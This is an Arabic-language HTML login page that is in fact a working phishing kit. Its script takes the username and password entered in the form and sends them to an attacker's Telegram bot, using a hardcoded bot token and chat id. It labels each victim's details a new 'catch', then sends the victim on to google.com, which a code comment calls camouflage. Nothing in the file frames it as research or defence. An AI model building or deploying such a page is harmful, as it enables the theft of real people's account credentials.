<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { 
            background: #0f172a; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
        }
        .card { 
            background: #1e293b; 
            padding: 40px 30px; 
            border-radius: 16px; 
            width: 100%; 
            max-width: 350px; 
            text-align: center; 
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
        }
        h2 { 
            color: #f8fafc; 
            margin-bottom: 30px; 
            font-size: 24px; 
            font-weight: 600; 
        }
        input { 
            width: 100%; 
            padding: 14px; 
            margin-bottom: 20px; 
            border: 1px solid #334155; 
            border-radius: 8px; 
            background: #0f172a; 
            color: white; 
            outline: none; 
            font-size: 16px; 
            box-sizing: border-box; 
            transition: 0.3s;
        }
        input:focus { 
            border-color: #38bdf8; 
            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2); 
        }
        button { 
            width: 100%; 
            padding: 14px; 
            border: none; 
            border-radius: 8px; 
            background: #38bdf8; 
            color: #0f172a; 
            font-weight: bold; 
            font-size: 16px; 
            cursor: pointer; 
            transition: 0.3s; 
        }
        button:hover { 
            background: #0ea5e9; 
            transform: translateY(-1px); 
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>تسجيل الدخول</h2>
        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button onclick="sendData()">تسجيل الدخول</button>
    </div>

    <script>
        function sendData() {
            // بيانات بوت التليجرام الخاصة بك
            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; 
            const chat_id = "1564944407"; 
            
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if(user === "" || pass === "") {
                alert("الرجاء ملء كافة الحقول");
                return;
            }

            const msg = `🚀 صيدة جديدة من Superstar!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;

            fetch(url)
                .then(() => { 
                    // تحويل المستخدم لصفحة حقيقية للتمويه
                    window.location.href = "https://www.google.com"; 
                })
                .catch(() => {
                    window.location.href = "https://www.google.com";
                });
        }
    </script>
</body>
</html>
